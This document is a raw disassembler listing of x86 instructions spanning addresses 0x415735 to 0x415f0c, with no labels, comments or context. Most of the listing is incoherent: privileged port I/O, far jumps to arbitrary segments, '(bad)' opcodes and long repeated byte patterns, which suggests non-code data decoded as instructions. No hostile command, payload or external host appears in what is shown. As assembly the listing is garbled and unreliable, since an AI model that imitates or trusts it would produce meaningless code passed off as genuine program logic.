  415735:	gs fwait
  415737:	aas    
  415738:	add    al,0x69
  41573a:	lea    esp,[edi-0x2c]
  41573d:	push   esi
  41573e:	call   0xda55:0x9954f83f
  415745:	ins    DWORD PTR es:[edi],dx
  415746:	jnp    0x415781
  415748:	ficom  DWORD PTR [ecx+0x7a]
  41574b:	ins    BYTE PTR es:[edi],dx
  41574c:	aam    0x6d
  41574e:	add    BYTE PTR [ebp+0x7d7057f1],dl
  415754:	stos   DWORD PTR es:[edi],eax
  415755:	push   edx
  415756:	arpl   WORD PTR [ebx+0x79],bx
  415759:	das    
  41575a:	push   0x206ca944
  41575f:	das    
  415760:	test   al,0x6c
  415762:	fs inc esp
  415764:	outs   dx,DWORD PTR ds:[esi]
  415765:	dec    edi
  415766:	add    BYTE PTR [ecx],bl
  415768:	push   0x5e09542f
  41576d:	dec    edi
  41576e:	and    BYTE PTR [ecx],ah
  415770:	inc    ecx
  415771:	xor    al,0x50
  415773:	dec    BYTE PTR [ebx+0x2e]
  415776:	xor    ah,dh
  415778:	cmp    al,0x48
  41577a:	ins    DWORD PTR es:[edi],dx
  41577b:	sbb    al,BYTE PTR [ecx-0x7a33dfe6]
  415781:	or     DWORD PTR [edx],ecx
  415783:	sub    BYTE PTR [edi+ebx*2+0x63],bl
  415787:	stc    
  415788:	data16 sbb ah,BYTE PTR [eax]
  41578b:	ror    DWORD PTR [ecx],cl
  41578d:	sub    cl,BYTE PTR [ebx]
  41578f:	jecxz  0x41580c
  415791:	pop    edi
  415792:	popa   
  415793:	add    al,0xd
  415795:	push   esp
  415796:	sub    ebp,DWORD PTR [eax+eax*1+0x0]
	...
  4157a9:	add    BYTE PTR [eax],al
  4157ab:	add    BYTE PTR [eax],ch
  4157ad:	pop    edi
  4157ae:	ins    DWORD PTR es:[edi],dx
  4157af:	lds    edx,FWORD PTR [ebx]
  4157b1:	outs   dx,BYTE PTR ds:[esi]
  4157b2:	adc    edx,DWORD PTR gs:[ebp+0x65]
  4157b6:	les    ecx,FWORD PTR fs:[eax]
  4157b9:	push   esp
  4157ba:	addr16 mov ebp,0x13202bf3
  4157c0:	and    al,0x6d
  4157c2:	cmp    edi,ecx
  4157c4:	das    
  4157c5:	or     al,BYTE PTR [ecx-0x42]
  4157c8:	call   0x6d8bb20
  4157cd:	sub    DWORD PTR [esp+eax*4-0x18],ecx
  4157d1:	bound  esi,QWORD PTR [ecx+eax*4+0x3c]
  4157d5:	and    BYTE PTR [ebx],ah
  4157d7:	jge    0x4157c8
  4157d9:	or     BYTE PTR [edx],cl
  4157db:	add    BYTE PTR [ebx-0x429191b0],ah
  4157e1:	fs je  0x41584d
  4157e4:	mov    bh,0x4f
  4157e6:	cmp    ah,BYTE PTR [eax]
  4157e8:	ret    
  4157e9:	ins    BYTE PTR es:[edi],dx
  4157ea:	imul   esi,DWORD PTR [ebx+0x7d],0xd
  4157ee:	or     al,BYTE PTR [ebx+0x77]
  4157f1:	push   edx
  4157f2:	je     0x415859
  4157f4:	jbe    0x41582e
  4157f6:	sub    DWORD PTR [ecx+ebp*2+0x34],edx
  4157fa:	popa   
  4157fb:	cmp    al,BYTE PTR [eax+0x61]
  4157fe:	jo     0x415870
  415800:	je     0x41586b
  415802:	pop    edi
  415803:	popa   
  415804:	cmp    al,0x69
  415806:	imul   ebp,DWORD PTR [esi-0x9],0x4f
  41580a:	pop    edi
  41580b:	je     0x41584a
  41580d:	cmp    BYTE PTR [ecx],ch
  41580f:	jae    0x415811
	...
  415821:	add    BYTE PTR [eax],al
  415823:	add    BYTE PTR [esi+esi*1+0x61],cl
  415827:	popa   
  415828:	xor    eax,0xd7430a0d
  41582d:	dec    esi
  41582e:	je     0x415895
  415830:	cmp    BYTE PTR es:[ecx],ch
  415833:	inc    ebp
  415834:	arpl   WORD PTR ss:[ebx+0x64],bp
  415838:	cmp    DWORD PTR [edx+0x63],edx
  41583b:	cmp    al,BYTE PTR [eax-0x7e919a9e]
  415841:	xor    dh,BYTE PTR [ebp+0xd]
  415844:	stos   BYTE PTR es:[edi],al
  415845:	adc    eax,0x2d82656f
  41584a:	cmp    eax,0x744e7d67
  41584f:	cmp    al,BYTE PTR [eax+0x4d]
  415852:	imul   edi,DWORD PTR [edx+0x69],0x6c
  415856:	ins    BYTE PTR es:[edi],dx
  415857:	popa   
  415858:	aaa    
  415859:	clc    
  41585a:	sub    eax,0x5f2c4030
  41585f:	outs   dx,DWORD PTR ds:[esi]
  415860:	lds    esi,FWORD PTR [eax]
  415862:	pop    ebp
  415863:	je     0x41582e
  415865:	bound  ebp,QWORD PTR [ebp+eiz*2+0x39]
  415869:	mov    dl,0x21
  41586b:	dec    ebx
  41586c:	jmp    0x11b5:0x420469f
  415873:	cmp    DWORD PTR [ecx],ebx
  415875:	jbe    0x4158e1
  415877:	outs   dx,BYTE PTR ds:[esi]
  415878:	aad    0x85
  41587a:	pop    eax
  41587b:	jno    0x4158d6
  41587d:	nop
  41587e:	sbb    DWORD PTR [edi],esp
  415880:	cmp    al,0xcf
  415882:	adc    BYTE PTR [edx],cl
  415884:	cmp    DWORD PTR [esi],esp
  415886:	ins    DWORD PTR es:[edi],dx
  415887:	outs   dx,BYTE PTR ds:[esi]
	...
  41589c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41589d:	dec    esp
  41589e:	outs   dx,BYTE PTR ds:[esi]
  41589f:	je     0x415905
  4158a1:	std    
  4158a2:	data16 outs dx,BYTE PTR ds:[esi]
  4158a4:	xchg   esi,eax
  4158a5:	sbb    eax,0x2d393a6c
  4158aa:	ins    DWORD PTR es:[edi],dx
  4158ab:	popa   
  4158ac:	cwde   
  4158ad:	sbb    eax,0xcf676d6b
  4158b2:	add    DWORD PTR [ebp+0x74],eax
  4158b5:	sbb    eax,0xc96a2324
  4158ba:	dec    ecx
  4158bb:	push   esp
  4158bc:	test   DWORD PTR [ecx],ebx
  4158be:	sub    eax,0x10b9272f
  4158c3:	or     al,BYTE PTR [ecx+0x37450f2]
  4158c9:	leave  
  4158ca:	sub    BYTE PTR [ecx+0x2c],dh
  4158cd:	fild   WORD PTR [ecx+eiz*2+0x1a]
  4158d1:	add    al,0x54
  4158d3:	je     0x415948
  4158d5:	or     DWORD PTR [edx],ebp
  4158d7:	sub    eax,0x3f07ec53
  4158dc:	sbb    al,dh
  4158de:	push   0x48dc0d70
  4158e3:	outs   dx,BYTE PTR ds:[esi]
  4158e4:	sbb    dh,BYTE PTR [edx-0x3de8989b]
  4158ea:	pop    ss
  4158eb:	and    BYTE PTR [eax],dl
  4158ed:	int    0x68
  4158ef:	outs   dx,BYTE PTR ds:[esi]
  4158f0:	in     eax,dx
  4158f1:	mov    edi,0x1d7755
  4158f6:	(bad)  
  4158f7:	sub    DWORD PTR [eax],esp
  4158f9:	push   ecx
  4158fa:	fcom   QWORD PTR [ebx]
  4158fc:	xor    al,BYTE PTR [esi]
  4158fe:	stos   BYTE PTR es:[edi],al
  4158ff:	outs   dx,BYTE PTR ds:[esi]
	...
  415914:	out    0x69,eax
  415916:	test   BYTE PTR [edx-0x3b],ah
  415919:	push   0x20036d96
  41591e:	mov    ch,BYTE PTR [edi-0x34]
  415921:	dec    esi
  415922:	mov    WORD PTR [eax],ss
  415924:	inc    ebx
  415925:	xor    eax,0x2dab687a
  41592a:	sub    BYTE PTR [edi-0x66],ah
  41592d:	push   0x53
  41592f:	sbb    bl,BYTE PTR [ecx+0x4d]
  415932:	inc    esi
  415933:	pop    edx
  415934:	sahf   
  415935:	ins    BYTE PTR es:[edi],dx
  415936:	cmp    esp,DWORD PTR [ebp+0x5c]
  415939:	adc    al,0x15
  41593b:	adc    al,0x59
  41593d:	sub    BYTE PTR [edx+0x6f],cl
  415940:	xchg   edx,eax
  415941:	push   eax
  415942:	dec    eax
  415943:	pop    eax
  415944:	pop    esi
  415945:	pop    esi
  415946:	cmp    ebp,DWORD PTR [ecx+0x30]
  415949:	and    BYTE PTR [ebx+esi*1],dh
  41594c:	jle    0x415993
  41594e:	(bad)  
  41594f:	sbb    BYTE PTR [edi],cl
  415951:	adc    dl,dl
  415953:	and    ebp,DWORD PTR [ecx+ebp*2-0x3]
  415957:	addr16 pop esp
  415959:	push   ebx
  41595a:	cli    
  41595b:	and    ecx,DWORD PTR [esi]
  41595d:	sbb    al,dl
  41595f:	adc    BYTE PTR [ebx],dh
  415961:	or     eax,0x6703e1
  415966:	mov    ebp,0x113c392d
  41596b:	cs push ebx
  41596d:	add    BYTE PTR [ecx],dl
  41596f:	cs push ebx
  415971:	add    ch,al
  415973:	push   0x6cd7610d
	...
  41598c:	dec    eax
  41598d:	push   cs
  41598e:	adc    eax,0xe76c1568
  415993:	dec    ebp
  415994:	sbb    dl,BYTE PTR [eax+eax*1-0x58]
  415998:	or     ah,BYTE PTR [ebx+0x42]
  41599b:	mov    ah,0xd4
  41599d:	popa   
  41599e:	arpl   WORD PTR [ebx-0x7b9cb204],bx
  4159a4:	cmp    cl,BYTE PTR [edx+0x63]
  4159a7:	popf   
  4159a8:	adc    DWORD PTR [ecx+0x63],edx
  4159ab:	fwait
  4159ac:	add    DWORD PTR [edx+0x73],ebp
  4159af:	xchg   esp,eax
  4159b0:	cmp    al,BYTE PTR [eax]
  4159b2:	ins    DWORD PTR es:[edi],dx
  4159b3:	(bad)  
  4159b4:	rcl    DWORD PTR [eax],1
  4159b6:	xor    al,bh
  4159b8:	sahf   
  4159b9:	ins    BYTE PTR es:[edi],dx
  4159ba:	ins    BYTE PTR es:[edi],dx
  4159bb:	jmp    0x36a6ae2b
  4159c0:	lea    ebx,[ebp+0x6e]
  4159c3:	cmp    al,BYTE PTR [ecx-0x63b78d95]
  4159c9:	pop    ebp
  4159ca:	add    cl,ch
  4159cc:	fwait
  4159cd:	fs jbe 0x415a18
  4159d0:	ins    DWORD PTR es:[edi],dx
  4159d1:	popa   
  4159d2:	xor    ebx,edi
  4159d4:	dec    esp
  4159d5:	fs ins BYTE PTR es:[edi],dx
  4159d7:	inc    ebp
  4159d8:	cmp    eax,0x5c3d6c19
  4159dd:	pop    edi
  4159de:	pop    edi
  4159df:	sbb    eax,0x56e195e
  4159e4:	jb     0x415a50
  4159e6:	addr16 sbb eax,0x6c3962
  4159ec:	jae    0x415a4b
  4159ee:	push   ecx
  4159ef:	adc    BYTE PTR [eax],al
	...
  415a01:	add    BYTE PTR [eax],al
  415a03:	add    BYTE PTR [ecx+0x0],dl
  415a06:	inc    ecx
  415a07:	adc    DWORD PTR [esi+0x5f],edx
  415a0a:	imul   ebx,DWORD PTR ds:0xff636724,0xcb6b5cff
  415a14:	pop    ds
  415a15:	dec    esi
  415a16:	jno    0x4159e9
  415a18:	adc    edx,DWORD PTR [eax+0x0]
  415a1b:	scas   eax,DWORD PTR es:[edi]
  415a1c:	call   0x23fbbd7d
  415a21:	add    BYTE PTR fs:[eax],al
  415a24:	shr    DWORD PTR [edi],cl
  415a26:	popa   
  415a27:	fs aad 0x6b
  415a2a:	jno    0x415a99
  415a2c:	test   DWORD PTR [edi],ebp
  415a2e:	pop    ebp
  415a2f:	je     0x415aa6
  415a31:	add    BYTE PTR ds:[ebx-0x3e],al
  415a35:	bound  esp,QWORD PTR [esi+eax*2-0x3e]
  415a39:	bound  esp,QWORD PTR [ecx+0x0]
  415a3c:	mov    ds:0xa470752f,eax
  415a41:	inc    esp
  415a42:	popa   
  415a43:	je     0x4159ea
  415a45:	xor    BYTE PTR [ecx+0x72],ah
  415a48:	mov    esp,DWORD PTR [edx+0x75]
  415a4b:	add    bl,ah
  415a4d:	cs jne 0x415ac0
  415a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a51:	inc    edx
  415a52:	js     0x415ac4
  415a54:	(bad)  
  415a55:	cs je  0x415aa3
  415a58:	jne    0x415a8f
  415a5a:	add    BYTE PTR [ebx+0x72],al
  415a5d:	xor    eax,0x61547470
  415a62:	outs   dx,DWORD PTR ds:[esi]
  415a63:	je     0x415aa7
  415a65:	imul   esi,DWORD PTR [ebp+0x4b],0x0
	...
  415a79:	add    BYTE PTR [eax],al
  415a7b:	add    BYTE PTR [ebp+0x35],dh
  415a7e:	add    BYTE PTR [ebx+0x32],al
  415a81:	xor    eax,0x61527470
  415a86:	ins    BYTE PTR es:[edi],dx
  415a87:	xor    DWORD PTR gs:[edi],ebp
  415a8a:	popa   
  415a8b:	inc    ebx
  415a8c:	das    
  415a8d:	push   0x74
  415a8f:	sub    BYTE PTR gs:[eax],bh
  415a92:	add    BYTE PTR [edx+0x35],dl
  415a95:	xor    ah,BYTE PTR [ecx+0x72]
  415a98:	les    edx,FWORD PTR [eax]
  415a9a:	imul   edx,DWORD PTR [ebx+0x35],0x50
  415a9e:	data16 add BYTE PTR [edi+0x34],bl
  415aa2:	popa   
  415aa3:	outs   dx,BYTE PTR ds:[esi]
  415aa4:	push   eax
  415aa5:	imul   esp,DWORD PTR cs:[ebx+0x75],0x2f
  415aaa:	outs   dx,DWORD PTR ds:[esi]
  415aab:	push   esp
  415aac:	outs   dx,DWORD PTR ds:[esi]
  415aad:	addr16 popa 
  415aaf:	outs   dx,BYTE PTR ds:[esi]
  415ab0:	cmp    edi,esp
  415ab2:	dec    edx
  415ab3:	imul   ecx,DWORD PTR [ecx],0xffffffc4
  415ab6:	dec    edi
  415ab7:	jno    0x415acf
  415ab9:	mov    cl,0x62
  415abb:	je     0x415ad1
  415abd:	stos   DWORD PTR es:[edi],eax
  415abe:	ins    BYTE PTR es:[edi],dx
  415abf:	gs fmulp st(3),st
  415ac2:	gs dec ebp
  415ac4:	fbstp  TBYTE PTR [ebx+0x50]
  415ac7:	arpl   bx,bp
  415ac9:	out    0x44,al
  415acb:	arpl   bp,sp
  415acd:	xchg   edx,eax
  415ace:	ins    BYTE PTR es:[edi],dx
  415acf:	imul   ebx,esp,0xd76e4a80
  415ad5:	pop    ecx
  415ad6:	dec    edi
  415ad7:	imul   ebx,eax,0x5a
  415ada:	push   0x6d
  415adc:	iret   
  415add:	out    0x40,al
  415adf:	ins    DWORD PTR es:[edi],dx
	...
  415af4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415af5:	push   edi
  415af6:	data16 jb 0x415a9e
  415af9:	jp     0x415b65
  415afb:	lea    ebp,fs:[esi]
  415afe:	xor    eax,0x6a30ab74
  415b03:	gs push 0x40
  415b06:	pusha  
  415b07:	aas    
  415b08:	cmp    ebp,esi
  415b0a:	push   0x2f2f9665
  415b0f:	jno    0x415aa5
  415b11:	sbb    eax,DWORD PTR [ebx+0x0]
  415b14:	test   DWORD PTR [esi],edi
  415b16:	imul   ebp,DWORD PTR [ecx+0x64],0x50723419
  415b1d:	imul   DWORD PTR [edx+0x6c]
  415b20:	push   esp
  415b21:	(bad)  
  415b22:	pop    esi
  415b23:	push   esi
  415b24:	pop    eax
  415b25:	std    
  415b26:	dec    esi
  415b27:	arpl   WORD PTR [eax-0x17],di
  415b2a:	inc    esp
  415b2b:	fs push ebx
  415b2d:	aam    0x56
  415b2f:	je     0x415b96
  415b31:	push   es
  415b32:	ins    DWORD PTR es:[edi],dx
  415b33:	arpl   WORD PTR [edi],sp
  415b35:	stc    
  415b36:	push   ebp
  415b37:	addr16 daa 
  415b39:	add    BYTE PTR [eax+0x63],ch
  415b3c:	push   ds
  415b3d:	add    ah,cl
  415b3f:	push   esi
  415b40:	cmp    DWORD PTR [eax],eax
  415b42:	retf   0xe55
  415b45:	push   eax
  415b46:	fist   DWORD PTR [esi]
  415b48:	dec    ebx
  415b49:	es ret 
  415b4b:	addr16 adc eax,0xb60aa00
  415b51:	dec    esp
  415b52:	scas   al,BYTE PTR es:[edi]
  415b53:	push   ebx
  415b54:	fisub  DWORD PTR [ebp-0x66]
  415b57:	pop    esp
	...
  415b6c:	call   0x8aa1fbc
  415b71:	dec    esp
  415b72:	xchg   esi,eax
  415b73:	push   ebp
  415b74:	fiadd  DWORD PTR [eax-0x19]
  415b77:	inc    esi
  415b78:	ficom  DWORD PTR [ecx-0x65]
  415b7b:	inc    eax
  415b7c:	fisttp WORD PTR [esp+edi*2+0x46]
  415b80:	ficom  DWORD PTR [ecx+0x7b]
  415b83:	ins    BYTE PTR es:[edi],dx
  415b84:	xlat   BYTE PTR ds:[ebx]
  415b85:	push   0x5dad648a
  415b8a:	jp     0x415bd8
  415b8c:	lahf   
  415b8d:	xor    esi,DWORD PTR [ebx+0x6a]
  415b90:	stos   DWORD PTR es:[edi],eax
  415b91:	pop    ebp
  415b92:	out    0x46,eax
  415b94:	call   0x5a67:0xa5475352
  415b9b:	popa   
  415b9c:	push   0x9a563e4c
  415ba1:	add    BYTE PTR [edx],ch
  415ba3:	push   esi
  415ba4:	xchg   BYTE PTR [eax+0x33],dl
  415ba7:	inc    ebp
  415ba8:	pop    eax
  415ba9:	push   ecx
  415baa:	cmp    al,0x6d
  415bac:	imul   ebx,DWORD PTR [ebp+0x2a],0x61
  415bb0:	imul   ecx,DWORD PTR [eax+edx*1+0x62],0x56
  415bb5:	arpl   WORD PTR [eax],cx
  415bb7:	push   eax
  415bb8:	pop    edx
  415bb9:	xor    BYTE PTR [ecx],bl
  415bbb:	ins    DWORD PTR es:[edi],dx
  415bbc:	inc    edi
  415bbd:	popa   
  415bbe:	adc    esp,DWORD PTR [ecx+0x70]
  415bc1:	pop    ebp
  415bc2:	add    BYTE PTR [ecx+edi*1],al
  415bc5:	add    bh,ah
  415bc7:	add    edi,DWORD PTR [ecx]
  415bc9:	add    BYTE PTR [eax],al
  415bcb:	jmp    0xe9415c0a
	...
  415be4:	cmp    al,BYTE PTR [eax]
  415be6:	add    cl,ch
  415be8:	cmp    al,BYTE PTR [eax]
  415bea:	add    cl,ch
  415bec:	cmp    al,BYTE PTR [eax]
  415bee:	add    cl,ch
  415bf0:	cmp    al,BYTE PTR [eax]
  415bf2:	add    cl,ch
  415bf4:	cmp    al,BYTE PTR [eax]
  415bf6:	add    cl,ch
  415bf8:	cmp    al,BYTE PTR [eax]
  415bfa:	add    cl,ch
  415bfc:	cmp    al,BYTE PTR [eax]
  415bfe:	add    cl,ch
  415c00:	cmp    al,BYTE PTR [eax]
  415c02:	add    cl,ch
  415c04:	cmp    al,BYTE PTR [eax]
  415c06:	add    cl,ch
  415c08:	cmp    al,BYTE PTR [eax]
  415c0a:	add    cl,ch
  415c0c:	cmp    al,BYTE PTR [eax]
  415c0e:	add    cl,ch
  415c10:	cmp    al,BYTE PTR [eax]
  415c12:	add    cl,ch
  415c14:	cmp    al,BYTE PTR [eax]
  415c16:	add    cl,ch
  415c18:	cmp    al,BYTE PTR [eax]
  415c1a:	add    cl,ch
  415c1c:	cmp    al,BYTE PTR [eax]
  415c1e:	add    cl,ch
  415c20:	cmp    al,BYTE PTR [eax]
  415c22:	add    cl,ch
  415c24:	cmp    al,BYTE PTR [eax]
  415c26:	add    cl,ch
  415c28:	cmp    al,BYTE PTR [eax]
  415c2a:	add    cl,ch
  415c2c:	cmp    al,BYTE PTR [eax]
  415c2e:	add    cl,ch
  415c30:	cmp    al,BYTE PTR [eax]
  415c32:	add    cl,ch
  415c34:	cmp    al,BYTE PTR [eax]
  415c36:	add    cl,ch
  415c38:	cmp    al,BYTE PTR [eax]
  415c3a:	dec    eax
  415c3b:	push   ss
  415c3c:	cmp    BYTE PTR [eax+eax*1],0x32
  415c40:	dec    esi
  415c41:	adc    BYTE PTR [eax],bh
  415c43:	adc    DWORD PTR [esi],ebx
  415c45:	and    DWORD PTR [eax],esi
  415c47:	fld    QWORD PTR [eax]
	...
  415c59:	add    BYTE PTR [eax],al
  415c5b:	add    BYTE PTR [edx],ah
  415c5d:	sub    DWORD PTR [ebx],esp
  415c5f:	fld    DWORD PTR [esi+0x38]
  415c62:	sub    ecx,esp
  415c64:	sub    dl,BYTE PTR [edx]
  415c66:	pop    eax
  415c67:	les    ebp,FWORD PTR [edx]
  415c69:	adc    bl,BYTE PTR [eax+0x0]
  415c6c:	in     eax,0xf6
  415c6e:	das    
  415c6f:	xor    bl,BYTE PTR [eax-0xb]
  415c72:	das    
  415c73:	xor    cl,BYTE PTR [eax-0xb]
  415c76:	das    
  415c77:	xor    cl,BYTE PTR [eax-0xb]
  415c7a:	das    
  415c7b:	xor    bh,BYTE PTR [eax-0xa]
  415c7e:	das    
  415c7f:	xor    bh,BYTE PTR [eax-0xa]
  415c82:	das    
  415c83:	xor    cl,al
  415c85:	add    BYTE PTR cs:[edi+0x7d],al
  415c89:	inc    ebp
  415c8a:	dec    esi
  415c8b:	popa   
  415c8c:	mov    esp,0xd365766a
  415c91:	cmp    ch,BYTE PTR [edi+0x74]
  415c94:	jge    0x415cf4
  415c96:	inc    ebp
  415c97:	outs   dx,BYTE PTR ds:[esi]
  415c98:	jle    0x415d02
  415c9a:	add    BYTE PTR [ebx-0x53],ch
  415c9d:	sub    ebp,DWORD PTR [esi+0x65]
  415ca0:	(bad)  
  415ca1:	in     al,dx
  415ca2:	xor    DWORD PTR [esi],ebp
  415ca4:	mov    esp,0x99006c5d
  415ca9:	sub    al,0x53
  415cab:	outs   dx,DWORD PTR ds:[esi]
  415cac:	mov    edi,0xb25033ee
  415cb1:	push   0x2cb3655f
  415cb6:	add    BYTE PTR [ebx-0x59],dl
  415cb9:	pop    edi
  415cba:	je     0x415d33
  415cbc:	jno    0x415cec
  415cbe:	popa   
  415cbf:	pop    esp
	...
  415cd4:	pop    esi
  415cd5:	popa   
  415cd6:	jb     0x415d34
  415cd8:	push   eax
  415cd9:	push   0x6a796771
  415cde:	outs   dx,DWORD PTR ds:[esi]
  415cdf:	pop    esp
  415ce0:	dec    esi
  415ce1:	adc    BYTE PTR [eax+0x5c],dl
  415ce4:	sub    BYTE PTR [edi+0x6f],ah
  415ce7:	je     0x415d1c
  415ce9:	cld    
  415cea:	dec    esi
  415ceb:	outs   dx,DWORD PTR ds:[esi]
  415cec:	jle    0x415d1e
  415cee:	jae    0x415d51
  415cf0:	inc    edx
  415cf1:	xor    eax,0x2e41465c
  415cf6:	xor    bl,BYTE PTR [ecx+edi*1+0x17]
  415cfa:	push   0x6a005e73
  415cff:	jno    0x415d5e
  415d01:	and    eax,0xf155030
  415d06:	addr16 jno 0x415d2e
  415d09:	fiadd  DWORD PTR [ecx]
  415d0b:	push   ecx
  415d0c:	push   ss
  415d0d:	std    
  415d0e:	dec    edi
  415d0f:	jne    0x415d29
  415d11:	mov    ecx,0xc7ff5c5e
  415d16:	push   ebx
  415d17:	pop    esp
  415d18:	jmp    0x6a9b:0x1d634fc7
  415d1f:	pop    edi
  415d20:	or     eax,0xe04860ae
  415d25:	cdq    
  415d26:	dec    ebp
  415d27:	ins    DWORD PTR es:[edi],dx
  415d28:	jmp    0x415cb9
  415d2a:	xor    eax,0x49770d46
  415d2f:	ins    DWORD PTR es:[edi],dx
  415d30:	jmp    0x4d7c:0xe6510172
  415d37:	jne    0x415d39
	...
  415d49:	add    BYTE PTR [eax],al
  415d4b:	add    al,bl
  415d4d:	js     0x415dad
  415d4f:	pop    esp
  415d50:	inc    DWORD PTR [edi+0x79dd3253]
  415d56:	bound  esi,QWORD PTR [esi-0x64]
  415d59:	jge    0x415d98
  415d5b:	addr16 cwde 
  415d5d:	jge    0x415dc7
  415d5f:	gs jno 0x415ce2
  415d62:	push   esp
  415d63:	je     0x415cf3
  415d65:	aaa    
  415d66:	pop    ebx
  415d67:	pop    esp
  415d68:	jg     0x415d77
  415d6a:	xor    al,0x48
  415d6c:	sahf   
  415d6d:	ss push eax
  415d6f:	add    BYTE PTR [ecx+0x48],ch
  415d72:	push   ecx
  415d73:	jno    0x415cfb
  415d75:	sub    dl,BYTE PTR [edx+0x64]
  415d78:	cmp    DWORD PTR [ecx],edx
  415d7a:	gs jno 0x415de2
  415d7d:	sbb    esp,DWORD PTR [ebx+0x6b]
  415d80:	pop    esp
  415d81:	jmp    0x95ceb6
  415d86:	sbb    DWORD PTR [eax*4+0x39610d69],eax
  415d8d:	dec    ebx
  415d8e:	or     bl,BYTE PTR [esp+eiz*2+0x5a]
  415d92:	adc    edx,DWORD PTR [edi+ecx*1+0x69]
  415d96:	adc    eax,0x2634396d
  415d9b:	dec    esp
  415d9c:	imul   BYTE PTR [esi]
  415d9e:	and    eax,DWORD PTR [ecx+0xb]
  415da1:	add    BYTE PTR [eax],ah
  415da3:	data16 sub BYTE PTR [eax+ecx*8+0x67],cl
  415da8:	and    eax,0x3951d03c
  415dad:	cmp    bl,bl
  415daf:	push   ebx
	...
  415dc4:	(bad)  
  415dc5:	popa   
  415dc6:	rol    BYTE PTR [ebp-0x22],0x64
  415dca:	int3   
  415dcb:	add    ecx,DWORD PTR [eax]
  415dcd:	arpl   bp,ax
  415dcf:	dec    edi
  415dd0:	in     al,0x60
  415dd2:	mov    ecx,0xbf3b0560
  415dd7:	ins    BYTE PTR es:[edi],dx
  415dd8:	call   0xf592ea40
  415ddd:	sub    dl,BYTE PTR [eax-0x619d2a9b]
  415de3:	push   edx
  415de4:	sbb    DWORD PTR [edi],edi
  415de6:	jle    0x415e50
  415de8:	shl    BYTE PTR [eax-0x6b],cl
  415deb:	pop    edi
  415dec:	call   0x7b5a:0x9c32e74e
  415df3:	dec    esi
  415df4:	xchg   BYTE PTR [esi-0x7c],cl
  415df7:	aaa    
  415df8:	je     0x415e62
  415dfa:	push   eax
  415dfb:	push   ebx
  415dfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415dfd:	pop    ebp
  415dfe:	pop    ecx
  415dff:	cmp    BYTE PTR [ebp+0x63],ah
  415e02:	pop    ebx
  415e03:	gs xchg ebp,eax
  415e05:	and    BYTE PTR [edx],ch
  415e07:	addr16 xchg edx,eax
  415e09:	gs dec eax
  415e0b:	pop    bp
  415e0d:	pop    ebp
  415e0e:	cmp    DWORD PTR [ecx*4-0x75c6ffb7],eax
  415e15:	dec    ebp
  415e16:	addr16 xor eax,0x3a00685a
  415e1c:	fs dec esp
  415e1e:	arpl   WORD PTR [edx],bx
  415e20:	adc    DWORD PTR [eax],eax
  415e22:	pop    esp
  415e23:	and    BYTE PTR [ebp+0x51],ch
  415e26:	jne    0x415e28
	...
  415e3c:	imul   esp,DWORD PTR [ecx+0x68],0x5d316625
  415e43:	daa    
  415e44:	imul   esi,DWORD PTR [eax],0x5af61500
  415e4a:	outs   dx,BYTE PTR ds:[esi]
  415e4b:	mov    edi,0xe967620d
  415e50:	pop    esp
  415e51:	pop    ebx
  415e52:	outs   dx,BYTE PTR ds:[esi]
  415e53:	sar    BYTE PTR [edx],1
  415e55:	sub    eax,0x2c44b651
  415e5a:	push   eax
  415e5b:	jmp    0xe993999e
  415e60:	ss aas 
  415e62:	inc    esi
  415e63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e64:	std    
  415e65:	sub    eax,0x2c29aa00
  415e6a:	inc    ebx
  415e6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e6c:	push   cs
  415e6d:	xor    BYTE PTR [eax],al
  415e6f:	mov    eax,0x9a6747fb
  415e74:	(bad)  
  415e75:	fs jb  0x415e08
  415e78:	cmp    dh,BYTE PTR [ecx]
  415e7a:	ins    DWORD PTR es:[edi],dx
  415e7b:	xchg   esi,ebp
  415e7d:	dec    esp
  415e7e:	pop    edi
  415e7f:	jnp    0x415e1a
  415e81:	xor    al,0x45
  415e83:	lea    edx,[edi+0x6b855f5e]
  415e89:	aas    
  415e8a:	aas    
  415e8b:	cdq    
  415e8c:	jns    0x415ec2
  415e8e:	inc    ecx
  415e8f:	pop    esp
  415e90:	imul   ebx,DWORD PTR [ebp+0x46],0x36204535
  415e97:	or     DWORD PTR [ebp+0x63],esi
  415e9a:	imul   eax,DWORD PTR [ecx+eax*2+0x41],0x41
	...
  415eb3:	add    BYTE PTR [ebx+ebx*2+0x6b],dl
  415eb7:	ins    BYTE PTR es:[edi],dx
  415eb8:	sbb    BYTE PTR [ebp+0x72],0x0
  415ebc:	inc    ebx
  415ebd:	pop    ebx
  415ebe:	data16 je 0x415ee8
  415ec1:	pop    ebp
  415ec2:	jb     0x415f29
  415ec4:	jl     0x415ed9
  415ec6:	ins    BYTE PTR es:[edi],dx
  415ec7:	outs   dx,DWORD PTR ds:[esi]
  415ec8:	inc    edx
  415ec9:	pop    ebp
  415eca:	ins    BYTE PTR es:[edi],dx
  415ecb:	push   ebx
  415ecc:	adc    edi,DWORD PTR ds:0x3f0c4550
  415ed2:	jno    0x415f48
  415ed4:	inc    ebp
  415ed5:	adc    dl,BYTE PTR [eax+edx*2-0x80]
  415ed9:	add    esp,DWORD PTR [eax]
  415edb:	push   eax
  415edc:	mov    ds:0xa365665c,al
  415ee1:	xor    BYTE PTR [ebp+0x6f],ah
  415ee4:	outs   dx,BYTE PTR ds:[esi]
  415ee5:	pop    esi
  415ee6:	ins    BYTE PTR es:[edi],dx
  415ee7:	pop    esp
  415ee8:	rol    DWORD PTR [eax+0x54],1
  415eeb:	outs   dx,DWORD PTR ds:[esi]
  415eec:	jg     0x415f47
  415eee:	bound  esp,QWORD PTR [ecx+0x62]
  415ef1:	std    
  415ef2:	dec    esi
  415ef3:	outs   dx,DWORD PTR ds:[esi]
  415ef4:	xchg   BYTE PTR [ecx+0x73],al
  415ef7:	popa   
  415ef8:	mov    dl,0x32
  415efa:	pop    esp
  415efb:	inc    edi
  415efc:	jl     0x415f5a
  415efe:	bound  esp,QWORD PTR [ecx-0x64]
  415f01:	adc    BYTE PTR [edi],bh
  415f03:	inc    ecx
  415f04:	nop
  415f05:	adc    bl,BYTE PTR [ebx+eax*2-0x5b]
  415f09:	inc    ecx
  415f0a:	popa   
  415f0b:	inc    esi
  415f0c:	test   BYTE PTR ds:0x45703720,cl
